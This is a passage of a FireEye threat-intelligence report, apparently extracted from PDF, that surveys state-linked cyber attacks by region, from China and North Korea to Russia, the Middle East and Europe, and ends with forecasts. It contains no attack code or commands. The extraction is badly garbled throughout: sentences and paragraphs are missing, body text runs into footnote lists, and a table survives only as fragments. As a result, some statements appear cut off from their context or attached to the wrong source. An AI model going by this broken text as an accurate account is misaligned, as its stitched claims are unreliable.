surreptitious control of a cybercriminal, is called a zombie, and botnets are sometimes called zombie
armies.Also, compared to stockpiling tanks and artillery, writing cyber attack code, and compromising
thousands if not millions of computers, is easy.Moreover, malware often spreads with the exponential
growth of an infectious disease.This report examines many publicly known cyber attacks.By exploring some of the distinctive national
or regional characteristics of these attacks, organizations can better identify their attackers, anticipate
future attacks, and defend themselves.</section>


<footer>
FireEye, Inc.   World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	        3
</footer>

<section>
<heading>A Word of Warning</heading>
The analytical waters surrounding cyber warfare are inherently murky.At the strategic level,
governments desire to have a degree of plausible deniability.At the tactical level, military and
intelligence organizations envelop such operations in layers of classification and secrecy.To be
effective, information operations rely on deception—and the Internet offers an ideal venue for
a spy’s smoke and mirrors.In practical terms, hackers often run their attacks through cyber terrain
(such as compromised, third-party networks) that present investigators with technical and jurisdictional
complications.And finally, cybercriminal tools, tactics, and procedures (TTPs) evolve so quickly that
cyber defense, legislation, and law enforcement remain behind the attacker’s curve.“The biggest challenge to deterring, defending against, or retaliating for cyber attacks is the problem
of correctly identifying the perpetrator,” said Prof. John Arquilla, Naval Postgraduate School in an email
interview with FireEye.® “Ballistic missiles come with return addresses.But computer viruses, worms, and
denial of service attacks often emanate from behind a veil of anonymity.The best chance to pierce
this veil comes with the skillful blending of forensic back-hacking techniques with deep knowledge of
others’ strategic cultures and their geopolitical aims.”
Cyber “attribution”—identifying a likely culprit, whether an individual, organization, or nation-state—is
notoriously difficult, especially for any single attack.States are often mistakenly identified as non-state
actors, and vice versa.To make matters worse, ties between the two are increasing.First, a growing
number of “patriotic cybercriminals” ostensibly wage cyber war on behalf of governments (examples
include Chechnya and Kosovo in the 1990s, China in 2001, Estonia in 2007, Georgia in 2008, and every
year in the Middle East).<fn>1</fn> Second, cybercrime organizations offer anyone, including governments, cyber
attack services to include denial-of-service attacks and access to previously compromised networks.FireEye researchers have even seen one nation-state develop and use a sophisticated Trojan, and later
(after its own counter-Trojan defenses were in place) sell it to cybercriminals on the black market.Thus,
some cyber attack campaigns may bear the hallmarks of both state and non-state actors, making
positive attribution almost impossible.And finally, “false flag” cyber operations involve a hacker group
behaving like another to mislead cyber defense researchers.</section>

<section>
<heading>The FireEye Perspective</heading>
Within the shadowy world of cyber warfare, FireEye occupies a unique position.First, our threat
protection platform has been installed on thousands of sensitive networks around the world.This gives
our researchers a global and embedded presence in the cyber domain.Second, FireEye devices are
placed behind traditional security defenses such as firewalls, anti-virus, and intrusion prevention systems.This means that our “false positive” rate is extremely low, and that the attacks we detect have already
succeeded in penetrating external network defenses.</section>


<footnote>
     1	 Geers K. (2008) “Cyberspace and the Changing Nature of Warfare,” Hakin9 E-Book, 19(3) No.6; SC Magazine (27 AUG 08) 1-12.</footnote>

<footer>
FireEye, Inc.   World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	                               4
</footer>

<section>
<heading>Asia-Pacific</heading>
<heading>China—the elephant in the room</heading>
The People’s Republic of China is the noisiest threat actor in cyberspace.The reasons for this include
its huge population, a rapidly expanding economy, and a lack of good mitigation strategies on the
part of its targets.<heading>Chinese attacks on the U.S.</heading>
The list of successful Chinese compromises is long, and spans the entire globe.Others offer Chinese intelligence access to sensitive communications, from senior
government officials to Chinese political dissidents.</section>


<footnote>
     2	 Gerth, J.& Risen, J.(2 May 1999) “1998 Report Told of Lab Breaches and China Threat,” The New York Times.3	 Gorman, S., Cole, A.& Dreazen, Y.(21 Apr 2009) “Computer Spies Breach Fighter-Jet Project,” The Wall Street Journal.4	 Gross, M.J. (1 Sep 2011) “Enter the Cyber-dragon,” Vanity Fair.5	 Gorman, S. (21 Dec 2011) “China Hackers Hit U.S. Chamber,” Wall Street Journal; and Ibid.6	 Perlroth, N. (1 Feb 2013) “Washington Post Joins List of News Media Hacked by the Chinese,” and “Wall Street Journal Announces That It,
     	 Too, Was Hacked by the Chinese,” The New York Times.7	 Clayton, M. (27 Feb 2013) “Exclusive: Cyberattack leaves natural gas pipelines vulnerable to sabotage,” The Christian Science Monitor.8	 Gertz, B.(1 May 2013) “Dam!Sensitive Army database of U.S. dams compromised; Chinese hackers suspected,” The Washington Times.</footnote>
<footer>

FireEye, Inc.    World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	                                           5
</footer>

<figure>CHINA</figure>



<section>
<heading>Chinese attacks outside the U.S.</heading>
Of course, the U.S. is not China’s only cyber target.All traditional, geopolitical conflicts have moved into
cyberspace, and Chinese compromises encompass the entire globe.But many contests have been
one-sided affairs, with all publicly known attacks emanating from China.•	 Europe: In 2006, Chinese cybercriminals targeted the UK House of Commons;<fn>9</fn> in 2007, German
   Chancellor Angela Merkel raised the problem of nation-state hacking with China’s President;<fn>10</fn>
   in 2010, British MI5 warned that undercover Chinese intelligence officers had given UK business
   executives malware-laden digital cameras and memory sticks.<fn>11</fn>
•	 India: Indian officials worry that China could disrupt their computer networks during a conflict.Chinese
   cybercriminals have even stolen classified documents.<fn>16</fn>



<footnote>
     9	 Warren, P. (18 Jan 2006) “Smash and grab, the hi-tech way,” The Guardian.10	 “Espionage Report: Merkel’s China Visit Marred by Hacking Allegations,” (27 Aug 2007) Spiegel.11	 Leppard, D. (31 Jan 2010) “China bugs and burgles Britain,” The Sunday Times.12	 Exclusive cyber threat-related discussions with FireEye researchers.13	 Pubby, M. (01 Jul 2012) “China hackers enter Navy computers, plant bug to extract sensitive data,” The Indian Express.14	 Ungerleider, N. (19 Oct 2010) “South Korea’s Power Structure Hacked, Digital Trail Leads to China.” Fast Company.15	 Mick, J.(28 Jul 2011) “Chinese Hackers Score Heist of 35 Million South Koreans’ Personal Info,” Daily Tech.16	 McCurry, J.(20 Sep 2011) “Japan anxious over defence data as China denies hacking weapons maker,” The Guardian;
     	 and “China-based servers in Japan cyber attacks,” (28 Oct 2011) The Indian Express.The attack exposed data from 8,000 U.S. networks, 1,100 Australian
   networks, and 230 French networks.<fn>19</fn>
</section>
<section>
<heading>Chinese cyber tactics</heading>
The People’s Republic of China (PRC) is home to 1.35 billion people, or more than four times the
population of the United States.Therefore, China often has the ability to overwhelm cyber defenses with
quantity over quality, just as it did in the Korean War and as it might do in any other type of conflict.The Chinese malware that FireEye researchers have analyzed is not the most advanced or creative.But in many circumstances, it has been no less effective.China employs brute-force attacks that are
often the most inexpensive way to accomplish its objectives.The attacks succeed due to the sheer
volume of attacks, the prevalence and persistence of vulnerabilities in modern networks, and a seeming
indifference on the part of the cybercriminals to being caught.18	 Tracking GhostNet: Investigating a Cyber Espionage Network (29 March 2009) Information Warfare Monitor.19	 Vijayan, J.(18 Nov 2010) “Update: Report sounds alarm on China’s rerouting of U.S. Internet traffic,” Computerworld.</footnote>

<footer>
FireEye, Inc.    World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	                          7
</footer>

The “Comment Crew,”<fn>20</fn> a prominent example of a Chinese cyber threat actor, is believed to be a
contractor to the PRC government.The Comment Crew is behind many noteworthy attacks, including
Operation Beebus, which targets U.S. aerospace and defense industries.<fn>21</fn>
One important characteristic of the Comment Crew—which puts it definitively in the category of an
advanced persistent threat, or APT—is that it is a bureaucracy.In-depth analysis reveals a small group
of creative and strategic thinkers at the top.One layer down, a larger group of specialists design and
produce malware in an industrial fashion.At the bottom are the foot soldiers—brute-force hackers who
execute orders and wage extended cyber attack campaigns, from network reconnaissance to spear
phishing to data exfiltration.The Comment Crew is so large, in fact, that when the Federal Bureau of
Investigation (FBI) decoded one of the group’s stolen caches of information, if printed out, it would
have created a stack of paper taller than a set of encyclopedias.<fn>22</fn>
Such a large bureaucracy helps to explain sometimes-incongruous cybercriminal behavior.A given
piece of malware, for example, may have been written by an expert but incorrectly used later by an
inexperienced foot soldier (such as a poorly written spear phishing email).Understanding this cyber
attack life cycle and its different stages can help cyber defenders recognize and foil an attack.In any
large organization, some processes are less mature than others, and therefore easier to recognize.</section>
<section>
<heading>Chinese cyber defense</heading>
In its own defense, Chinese officials contend that their country is also a target of cyber attacks.21	 Pidathala, V., Kindlund, D. & Haq, T. (1 Feb 2013) “Operation Beebus,” FireEye.22	 Riley, M. & Lawrence, D. (26 Jul 2012) “Hackers Linked to China’s Army Seen From EU to D.C.,” Bloomberg.23	 “Significant Cyber Incidents Since 2006,” Center for Strategic and International Studies.24	 Ibid.25	 Ibid.26	 Rapoza, K. (22 June 2013) “U.S.Hacked China Universities, Mobile Phones, Snowden Tells China Press,” Forbes.27	 Hille, K. (5 Jun 2013) “China claims ‘mountains of data’ on cyber attacks by US,” Financial Times.</footnote>

<footer>
FireEye, Inc.    World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	                                         8
</footer>

<section>
<heading>North Korea—the upstart</heading>
North and South Korea remain locked in one of the most intractable conflicts on Earth.In 2009, North Korea launched its first major assault on South Korean and U.S. government websites.The
attack did little damage, but the incident gained wide media exposure.<fn>30</fn> By 2013, however, the threat
actors had matured.A group dubbed the “DarkSeoul Gang” was responsible for at least four years of
high-profile attacks on South Korea.The group’s attacks included a distributed denial-of-service (DDoS)
attack and malicious code that wiped computer hard drives at banks, media, ISPs, telcos, and financial
services companies—overwriting legitimate data with political messages.In the Korean conflict, such
incidents often take place on dates of historical significance, including July 4, the U.S.Independence
Day.<fn>31</fn> Suspected North Korean attacks on U.S. institutions include U.S. military elements based in South
Korea, the U.S.-based Committee for Human Rights in North Korea, and even the White House.North Korean defectors have described a burgeoning cyberwarfare department of 3,000 personnel,
largely trained in China and Russia.The defectors stressed that North Korea has a growing
fascinationwith cyber attacks as a cost-effective way to compete against its conventionally superior
foes.They believe that North Korea is growing increasingly comfortable and confident in this new
warfare domain, assessing that the Internet is not only vulnerable to attack but that this strategy can
create psychological pressure on the West.Toward this end, North Korea has focused on disconnecting
its important servers from the Internet, while building a dedicated “attack network.”<fn>32</fn>
FireEye researchers have seen a heavy use of spear phishing and the construction of a “watering hole,”
in which an important website is hacked in the hope of compromising the computers of its subsequent
visitors, who usually belong to a certain VIP-profile the attacker is targeting.Some North Korean attacks
have begun to manipulate a victim’s operating system settings and disable their anti-virus software—
techniques that are normally characteristic of Russian cybercriminals.In other words, North Korean
hackers may have learned from or have contracted support in Russia.Apart from any possible disruption or destruction stemming from cyber attacks, computer network
operations are an invaluable tool for collecting sensitive information, especially when it resides on
government or think-tank networks normally inaccessible from the Internet.North Korea, China, and
Russia are all naturally interested in collecting cyber intelligence that would increase their comparative
advantage in classified information, diplomatic negotiating positions, or future policy changes.<footnote>
     28	 McDonald, M. (21 Feb 2011) “Home Internet May Get Even Faster in South Korea,” The New York Times.29	 Gobry, P-E. (5 JUL 2011) “South Korea Will Replace All Paper With Tablets In Schools By 2015,” Business Insider.30	 Choe Sang-Hun, C. & Markoff, J.(8 Jul 2009) “Cyberattacks Jam Government and Commercial Web Sites in U.S. and South Korea,”
     	 The New York Times.31	 “Four Years of DarkSeoul Cyberattacks Against South Korea Continue on Anniversary of Korean War,” (27 Jun 2013) Symantec.32	 Fisher, M. (20 March 2013) “South Korea under cyber attack: Is North Korea secretly awesome at hacking?” The Washington Post.</footnote>
<footer>

FireEye, Inc.    World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	                                  9
</footer>

At the same time, North Korea also asserts that it is a target of cyber attacks from South Korea and the
U.S.But the quiet, borderless nature
of cyberspace means both sides are free to engage in cyber warfare—even during peacetime.Although chances of any regional war erupting in the near term are low, a large volume of ongoing,
regional cyber espionage activity is a constant.Targeted industries include telecommunications,
transportation, oil and gas, banks, and think tanks.The usual motivation is to gain tactical or strategic
advantage within the political, military, and economic domains.<fn>39</fn>
FireEye researchers are following numerous APT actors in this region, including BeeBus, Mirage, Check
Command, Taidoor, Seinup, and Naikon.Their most common tactic is spear phishing, often using
legitimate decoy documents that are related to the target’s national economy or politics, or to regional
events such as ASEAN summits, Asia-Pacific Economic Cooperation (APEC) summits, energy exploration,
or military affairs.<footnote>
     33	 Herman, S. (15 Mar 2013) “North Korea Blames US, South for ‘Cyber Attack’,” Voice of America.34	 “Significant Cyber Incidents Since 2006,” Center for Strategic and International Studies.35	 “India and Pakistan in cyber war,” (4 Dec 2010) Al-Jazeera.36	 Muncaster, P. (16 March 2012) “Hackers hit 112 Indian gov sites in three months,” The Register.37	 “Operation Hangover: Q&A on Attacks,” (20 May 2013) Symantec.38	 “Snorre Fagerland, et al.“Operation Hangover: Unveiling an Indian Cyberattack Infrastructure.” May 2013.39	 Finkle, J.(4 Aug 2011) “’State actor’ behind slew of cyber attacks,” Reuters.</footnote>
<footer>

FireEye, Inc.    World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	              10
</footer>

FireEye believes that many of these regional economic organizations are attractive targets for APT
campaigns because the information they possess is valuable and their level of cyber security awareness
is low.Often, these organizations have inconsistent system administration, infrequent software patch
management, poor policy control, or some combination of these issues.Thus, many of these networks
are “low-hanging fruit” for attackers.And to make matters worse, compromised systems are used as
staging grounds for further attacks on regional targets, by installing illicit command-and-control (CnC)
servers, abusing legitimate email accounts, and disseminating stolen office documents as “bait.”
</section>

<section>
<heading>Russia/Eastern Europe</heading>


<heading>Russia—a little bit “too quiet?”</heading>
In 1939, Winston Churchill declared that Russia was a “riddle wrapped in a mystery inside an enigma …”.Seven decades later, cyber defense researchers would say that not much has changed.Compared
with the constant attacks detected from China, you can almost hear the snow falling on Red Square.One of the outstanding questions in cyber security today is: Where are the Russians?Perhaps they are
simply great hackers.Maybe they have sufficient human intelligence.Whatever the reason, cyber
defense analysts often look in vain for the traces of Russian cybercriminals.As a step toward finding
some answers, however, consider the second half of Churchill’s quote: “… but perhaps there is a key—
that key is Russian national interest.”<fn>40</fn> In other words, where there is smoke, there is usually fire.In the mid-1990s, at the very dawn of the World Wide Web, Russia was engaged in a protracted struggle
over the fate of Chechnya; the Chechens became pioneers in cyber propaganda, and the Russians
became pioneers is shutting down their websites.In 1998, when Russian ally Serbia was under attack from
NATO, pro-Serbian hackers jumped in the fray, targeting NATO with DoS attacks and at least twenty-five
strains of virus-infected email.41	 Geers K. (2008) “Cyberspace and the Changing Nature of Warfare,” Hakin9 E-Book, 19(3) No.6; SC Magazine (27 AUG 08) 1-12.42	 “Overview by the US-CCU of the Cyber Campaign against Georgia in August of 2008,” (Aug 2009) U.S. Cyber Consequences Unit.43	 Lynn, W.J.(2010) “Defending a New Domain: The Pentagon’s Cyberstrategy,” Foreign Affairs 89(5) 97-108.44	 Stewart, W. & Delgado, M. (6 Dec 2009) “Were Russian security services behind the leak of ‘Climategate’ emails?”
     	 Daily Mail & “Global warning: New Climategate leaks,” (23 Nov 2011) RT.45	 Ustinova, A.(14 Jul 2010) “Microsoft Says 12th Alleged Russian Spy Was Employee,” Bloomberg.</footnote>

<footer>
FireEye, Inc.    World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	                               11
</footer>

One ironic aspect of nation-state cyber attacks—especially in authoritarian countries—is that many
of them are inward facing.In 2012, Russian security firm Kaspersky Lab announced the discovery of
“Red October,”<fn>46</fn> a cyber attack campaign that spied on millions of citizens around the world, but
chiefly within the former Soviet Union.Targets included embassies, research firms, military bases, energy
providers, nuclear agencies, and critical infrastructure.<fn>47</fn> Similarly, in 2013, researchers found malware
on millions of Android devices in Russia and in Russian-speaking countries.More specifically, Russian exploit code can be significantly
stealthier than its Chinese counterpart—which can also make it more worrisome.The “Red October”
campaign, including its satellite software dubbed “Sputnik,” is a prominent example of likely
Russian malware.TTP often includes the delivery of weaponized email attachments, though Russian cybercriminals
appear to be adept at changing their attack patterns, exploits, and data exfiltration methods to
evade detection.In fact, one telltale aspect of Russian hackers seems to be that, unlike the Chinese,
they go to extraordinary lengths to hide their identities and objectives.FireEye analysts have even
seen examples in which they have run “false-flag” cyber operations, designing their attack to appear
as if it came from Asia.<figure>RUSSIA</figure>



<footnote>
     46	 “The ‘Red October’ Campaign—An Advanced Cyber Espionage Network Targeting Diplomatic and Government Agencies” (14 Jan 2013)
     	 GReAT, Kaspersky Lab.47	 Lee, D. (14 Jan 2013) “’Red October’” cyber-attack found by Russian researchers,” BBC News
     48	 Jackson Higgins, K. (3 Aug 2013) “Anatomy of a Russian Cybercrime Ecosystem Targeting Android,” Dark Reading.49	 Gallagher, S. (18 Jun 2013) “US, Russia to install ‘cyber-hotline’ to prevent accidental cyberwar,” Ars Technica.50	 Ingersoll, G. (11 Jul 2013) “Russia Turns to Typewriters to Protect against Cyber Espionage,” Business Insider.51	 Gorshenin, V. (29 Aug 2013) “Russia to create cyber-warfare units,” Pravda.</footnote>
<footer>

FireEye, Inc.     World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	                           12
</footer>

One further problem for cyber defense researchers is that some Russian back doors into compromised
systems are hard to distinguish from advanced cybercriminal break-ins.Focused)

                         TTP Exemplars             Red October
</table>

     <caption>Table 2: Characteristics of Russian cyber attacks</caption>

</section>
<section>
<heading>Middle East</heading>
As a region, the Middle East may not possess the arsenal of zero-day exploits available in Russia, or
the brute-force numbers of China.Therefore, some Middle Eastern hackers may have to rely on cyber
tactics that emphasize novelty, creativity, and deception.For example, the 2012 Mahdi campaign, which infected targets in the Middle East, used malicious
Word documents, PowerPoint files, and PDFs to infect targets.That approach is similar to many other
attackers.But these attacks were accompanied by some imaginative elements such as games,
attractive images, and custom animations specifically designed to aid in the attack.Not only did they trick users into executing commands to install malicious code, but they also distracted
users from seeing malware-related warning messages.Furthermore, Mahdi attacks were tailored to
specific target audiences—for example by offering variations of games unique to each organization.Such pinpoint strikes rely on prior reconnaissance, help to evade cyber defense behavioral-detection
mechanisms, and dramatically increase the odds of compromise.So in the Middle East, the relative
sophistication of an attack may be calculated less in the technology, and more in the clever ways in
which malware is delivered and installed on a target network.It is therefore unsurprising that Iran—which has tense international
relations and is on the verge of acquiring a nuclear bomb—has also experienced the most
sophisticated cyber attacks to date.In 2010, Stuxnet was a “cyber missile” of sorts designed with painstaking precision to burrow deep
into Iran’s nuclear program and destroy physical infrastructure.(New York: 2012) pp.188-225.53	 Boldizsár Bencsáth.“Duqu, Flame, Gauss: Followers of Stuxnet,” BME CrySyS Lab, RSA 2012.54	 Simonite, T. (31 Aug 2012) “Bungling Cyber Spy Stalks Iran,” MIT Technology Review.</footnote>

<footer>
FireEye, Inc.    World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	                   14
</footer>

So how does anyone, including a nation-state, respond to a cyber attack?Does the counterstrike
remain within the cyber realm, or can it come in the form of a traditional military (or terrorist) assault?In
2012, Iran appears to have chosen the first option.The most
prominent hacker group by far is the Syrian Electronic Army (SEA), which is loyal to Syrian President
Bashar al-Assad.SEA has conducted DDoS attacks, phishing, pro-Assad defacements, and spamming
campaigns against governments, online services, and media that are perceived to be hostile to
the Syrian government.56	 Walker, D. (8 Mar 2013) “Hacktivists plan to resume DDoS campaign against U.S. banks,” SC Magazine.57	 Borak, D. (3 Mar 2009) “Source in Iran views Marine One blueprints,” Marine Corps Times.58	 Wai-yin Kwok, V. (13 Jan 2010) “Baidu Hijacked By Cyber Army,” Forbes.59	 Charette, R. (9 Sep 2011) “DigiNotar Certificate Authority Breach Crashes e-Government in the Netherlands,” IEEE Spectrum.60	 “Iranian anti-censorship software ‘Simurgh’ circulated with malicious backdoor,” (25 May 2012) Citizenlab.61	 Gorman, S. & Yadron, D. (23 May 2013) “Iran Hacks Energy Firms, U.S. Says,” Wall Street Journal.62	 Fisher, M. & Keller, J.(31 Aug 2011) “Syria’s Digital Counter-Revolutionaries.” The Atlantic; “Syrian Electronic Army,”
     	 (accessed 25 July, 2013) Wikipedia.63	 Manzoor, S. (25 July, 2013) “Slaves to the algorithm: Are stock market math geniuses, or quants, a force for good?” The Sunday Telegraph.To compromise its targets, the SEA often sends socially engineered, spear-phishing emails to lure
opposition activists into opening fraudulent, weaponized, and malicious documents.If the recipient falls
for the scam, Trojan horse, remote access tool (RAT) software is installed on the victim’s computer that
can give the attacker keystrokes, screenshots, microphone and webcam recordings, stolen documents,
and passwords.And of course, the SEA likely sends all of this information to a computer address lying
within Syrian government-controlled Internet Protocol (IP) space for intelligence collection and review.<fn>67</fn>
</section>


<section>
<heading>Israel: old conflict, new tactics</heading>
Even during the Cold War, the Arab-Israeli conflict saw many hot wars, and it was often the testing
ground for new military weapons and tactics.Nothing has changed in the Internet era.Since at least
2000, pro-Israeli hackers have targeted sites of political and military significance in the Middle East.<fn>68</fn>
In 2007, Israel reportedly disrupted Syrian air defense networks via cyber attack (with some collateral
damage to its own domestic networks) to facilitate the Israeli Air Force’s destruction of an alleged
Syrian nuclear facility.<fn>69</fn>



<footnote>
     64	 Khare, A.(19 July 2013) “Syrian Electronic Army Hacks Truecaller Database, Gains Access Codes to Social Media Accounts.” iDigital Times.65	 Kastrenakes, J.(22 July 2013) “Syrian Electronic Army alleges stealing ‘millions’ of phone numbers from chat app Tango.”
     	 The Verge; Albanesius, C. (23 July 2013) “Tango Messaging App Targeted by Syrian Electronic Army.” PCMag.66	 Ashford, W. (24 July 2013) “Syrian hacktvists hit second mobile app in a week.” Computer Weekly.67	 Tsukayama, H. (28 Aug 2013) “Attacks like the one against the New York Times should put consumers on alert,” The Washington Post.68	 Geers K. (2008) “Cyberspace and the Changing Nature of Warfare,” Hakin9 E-Book, 19(3) No.6; SC Magazine (27 AUG 08) 1-12.69	 Carroll, W. (26 Nov 2007) “Israel’s Cyber Shot at Syria,” Defense Tech.</footnote>

<footer>
FireEye, Inc.    World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	                                          16
</footer>

But as an advanced industrial nation, Israel also depends on information technology.The nation has
proven to be vulnerable to cyber attacks, which often target the Israeli economy.In 2009, during Israel’s
military operation in Gaza, hackers briefly paralyzed many government sites with a DDoS attack from at
least 500,000 computers.The 2009 attack consisted of four independent waves, each stronger than the
last, peaking at 15 million junk mail deliveries per second.The Israeli “Home Front Command” website,
which plays a key role in national defense communications with the public, was down for three hours.Due to technical similarities with the 2008 cyber attack on Georgia during its war with Russia, Israeli
officials surmised that the attack itself might have been carried out by a criminal organization in the
former Soviet Union, and paid for by Hamas or Hezbollah.<fn>70</fn>
Often, the trouble with cyber attacks is that they do not need to be highly sophisticated to succeed,
even against security-conscious Israel.In 2012, the ineptly written<fn>71</fn> “Mahdi” malware compromised at
least 54 targets in Israel.<fn>72</fn> Last but not least, in 2013, the Iranian media reported that the Syrian army had carried out a cyber attack against the water supply of the Israeli city of Haifa.Stuxnet in particular was developed with a singular goal (to disrupt Iranian nuclear
enrichment) that was both narrowly focused and capable of yielding strategic gains in the international
arena.In contrast to computer worms such as Slammer and Code Red, Stuxnet did not seek to
compromise as many computers as possible, but as few as possible.Even more amazing, its malicious
behavior was concealed under a veneer of apparently legitimate operational data—but ultimately,
the malware destroyed Iranian centrifuges.This family of malware was exquisitely designed.For example, its payload can arrive at its destination
encrypted—and become decrypted and installed only on a target device.This helps the malware to
evade the prying eyes of cyber defenders, making discovering and reverse engineering the malware
much more difficult.Ironically, this family of malware could be a paragon of over-engineering.For example, it not only
uses multiple zero-day exploits, but also world-first computational achievements such as a forced
cryptographic “hash collision.”<fn>76</fn> In the case of Iran (which is currently subject to a trade embargo
that restricts its acquisition of high technology), it is doubtful whether Iranian software is up-to-date or
properly configured.So the authors of Stuxnet could likely have used more conventional computer
exploits and still succeeded.<footnote>
     70	 Pfeffer, A.(15 Jun 2009) “Israel suffered massive cyber attack during Gaza offensive,” Haaretz.71	 Simonite, T. (31 Aug 2012) “Bungling Cyber Spy Stalks Iran,” MIT Technology Review.72	 Zetter, K. (17 Jul 2012) “Mahdi, the Messiah, Found Infecting Systems in Iran, Israel,” WIRED.73	 Yagna, Y.(26 May 2013) “Ex-General denies statements regarding Syrian cyber attack,” Haaretz.74	 Sanger, D. Confront and Conceal.(New York: 2012) pp.188-225.75	 Boldizsár Bencsáth.“Duqu, Flame, Gauss: Followers of Stuxnet,” BME CrySyS Lab, RSA 2012.76	 Goodin, Dan (7 Jun 2012) “Crypto breakthrough shows Flame was designed by world-class scientists,” Ars Technica.On the last point,
Richard Clarke, who served three U.S. Presidents as a senior counterterrorism official, argued that Stuxnet
was a U.S. operation because “it very much had the feel to it of having been written by or governed
by a team of Washington lawyers.”<fn>77</fn> Finally, the amount of work involved in these operations suggests
the participation of an enormous defense contractor base, with different companies specializing in
particular aspects of a large and complex undertaking.On the downside (and similar to the Israeli case), all advanced industrial economies are vulnerable
to cyber counterattack.In 2008, a CIA official informed a conference of critical infrastructure providers
that unknown cybercriminals, on multiple occasions, had been able to disrupt the power supply in
various foreign cities.<fn>78</fn> In the military domain, Iraqi insurgents used $26 off-the-shelf software to intercept live video feeds from U.S.Predator drones, likely giving them the ability to monitor and evade U.S.
military operations.<fn>79</fn> In the economic sphere, the U.S.-based International Monetary Fund (IMF) fell
victim to a phishing attack in 2011 that was described as a “very major breach.”<fn>80</fn>
Thus, while cyber attacks are relatively a new phenomenon, they represent a growing national security
challenge.As part of a broader effort to mitigate the threat, President Obama signed a directive in
2013 that the U.S. should aid allies who come under foreign cyber attack.<fn>81</fn>



<footnote>
     77	 Rosenbaum, R. (Apr 2012) “Richard Clarke on Who Was Behind the Stuxnet Attack,” Smithsonian.78	 Nakashima, E. & Mufson, S. (19 Jan 2008) “Hackers Have Attacked Foreign Utilities, CIA Analyst Says,” Washington Post.79	 Gorman, S., Dreazen, Y.& Cole, A.(17 Dec 2009) “Insurgents Hack U.S. Drones,” Wall Street Journal.80	 Sanger, D. & Markoff, J.(11 Jun 2011) “I.M.F.Reports Cyberattack Led to ‘Very Major Breach’,” New York Times.81	 Shanker, T. & Sanger, D. (8 Jun 2013) “U.S.Helps Allies Trying to Battle Iranian Hackers,” New York Times.</footnote>

<footer>
FireEye, Inc.     World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	                          18
</footer>
</section>

<section>
<heading>Europe</heading>
No prominent examples have been discovered of the European Union (EU) or the North Atlantic Treaty
Organization (NATO) conducting their own offensive cyber attacks.On the contrary, their leaders have
so far foresworn them.<fn>82</fn> But many examples reveal European networks getting hacked from other parts
of the world, particularly China and Russia.In 2011 alone, the European Commission complained of widespread hacking
before an EU summit,<fn>90</fn> the French government was compromised prior to a G-20 meeting,<fn>91</fn> and at least 10 Norwegian defense and energy companies were breached during large-scale contract
negotiations, via phishing that was specifically tailored to each company.<fn>92</fn>



<footnote>
     82	 Leyden, J.(6 June 2012) “Relax hackers!NATO has no cyber-attack plans—top brass,” The Register.83	 Arthur, C. (5 Feb 2011) “William Hague reveals hacker attack on Foreign Office in call for cyber rules,” The Observer.84	 “Hackers infiltrate German police and customs service computers,” (18 July 2011) Infosecurity Magazine.85	 Satter, R. (10 Nov 2012) “European Commission Officials Hacked At Internet Governance Forum,” Huffington Post.86	 Willsher, K. (7 Feb 2009) “French fighter planes grounded by computer virus,” The Telegraph.87	 Hopkins, N. (3 May 2012) “Hackers have breached top secret MoD systems, cyber-security chief admits,” The Guardian.88	 Krukowska, E. & Carr, M. (20 Jan 2011), “EU Carbon Trading Declines After Alleged Hacking Suspends Spot Market,” Bloomberg.89	 Rochford, O.(24 Feb 2013) “European Space, Industrial Firms Breached in Cyber Attacks: Report,” Security Week.90	 “’Serious’ cyber attack on EU bodies before summit,” (23 Mar 2011) BBC.91	 Charette, R. (8 Mar 2011) “’Spectacular’ Cyber Attack Gains Access to France’s G20 Files,” IEEE Spectrum.92	 Albanesius, C. (18 Nov 2011) “Norway Cyber Attack Targets Country’s Oil, Gas Systems,” PCMag.</footnote>

<footer>
FireEye, Inc.    World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	                                19
</footer>
</section>

<section>
<heading>Conclusion</heading>
World War Z told a story of idiosyncratic national behavior in response to a major international crisis.This report sought to highlight the same phenomenon in regard to the challenges posed by national
cyber insecurity and international cyber attacks.Behind every incident is an agenda—and individual
human beings—each unique and ultimately identifiable.The bigger the cyber campaign, the more
data it generates for security researchers, and the more difficulty attackers will have remaining
anonymous and hiding their agenda.As for crystal balls: no one knows what the next cyber attack will look like.But considering recent trends,
we can make a few educated guesses.Here are five factors that could change the world’s cyber security landscape in the near- to medium-term:
1.Outage of national critical infrastructure: we know that cyber attacks can disrupt government
   networks, but most current cases simply do not rise to the level of a national security threat.Stuxnet—
   and Iran’s alleged retaliation against Saudi Aramco—has shifted the thinking on cyber war from
   theory to something closer to reality.But have we seen the limit of what cyber attacks can achieve,
   or could cybercriminals threaten public safety by downing a power grid or financial market?2.Cyber arms treaty: if world leaders begin to view cyber attacks as more of a liability than an
   opportunity, they may join a cyber arms control regime or sign a non-aggression pact for
   cyberspace.However, arms control requires the ability to inspect for a prohibited item.President
   Reagan’s favorite Russian proverb was доверяй, но проверяй, or “trust but verify.” Given that a single
   USB stick can now hold billions of bits of information, verifying would be easier said than done.3.PRISM, freedom of speech, and privacy: we are still at the dawn of the Internet era, and this
   conversation has only just begun.It encompasses Daniel Ellsberg, Chelsea Manning, and Edward
   Snowden, as well as the Declaration of Independence, Enigma, and The Onion Router (TOR).Today,
   politicians, spooks, and hippies are all aware of a critical debate on the horizon—just how much
   online privacy should we have?4.New actors on the cyber stage: the revolutionary nature of computers and the amplification power
   of networks are not exclusive to the world’s largest nations.Iran, Syria, North Korea, and even non-
   state actors such as Anonymous have employed cyber attacks as a way to conduct diplomacy and
   wage war by other means.Researchers have little reason to think that other governments are not
   active in this domain.Possible candidates could be:
		a.	Poland: it was the Poles who first broke the German Enigma cipher—way back in 1932!Today, with programming talent and well-known rivalry with Russia, it is a possibility.b.	Brazil: Home to some of the world’s most prolific cybercriminals, will Brazil’s government,
